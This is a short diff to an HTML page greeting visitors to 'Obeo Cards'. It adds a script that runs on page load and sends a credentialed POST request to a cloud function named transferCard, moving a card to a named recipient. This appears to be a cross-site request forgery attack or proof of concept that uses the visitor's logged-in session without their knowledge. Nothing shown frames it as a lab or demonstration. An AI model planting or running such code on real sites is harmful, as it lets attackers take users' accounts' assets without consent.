@@ -9,5 +9,20 @@
     </body>
     <script>
         console.log("Welcome to Obeo Cards!");
+
+        fetch("https://us-central1-obeocards.cloudfunctions.net/transferCard", {
+            "body": "{\"data\":{\"recipientUsername\":\"Stéphane Bégaudeau\",\"cardId\":\"merck\"}}",
+            "method": "POST",
+            "mode": "cors",
+            "credentials": "include"
+            }).then(response => {
+                if (response.ok) {
+                    console.log("Card transferred successfully!");
+                } else {
+                    console.error("Failed to transfer card:", response.statusText);
+                }
+            }).catch(error => {
+                console.error("Error transferring card:", error);
+            });
     </script>
 </html>
